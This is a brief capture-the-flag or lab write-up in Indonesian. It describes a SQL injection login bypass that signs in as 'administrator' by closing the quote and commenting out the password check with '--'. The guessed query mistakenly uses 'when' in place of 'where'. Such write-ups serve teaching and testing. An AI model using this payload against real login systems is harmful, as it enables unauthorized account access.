# Overview Challenge
SQLI - Login functionality

## Goal
melakukan SQLI dan login sebagai `administrator`

# Analisis
Memberikan `'` pad username akan mendapat Internal Error

Kemungkinan yang query yang digunakan adalah seperti berikut
```sql
select firstname from users when username='admin' and password='admin'
```

Kita dapat gunakan payload:
```sql
select firstname from users when username='administrator'-- and password='admin'
```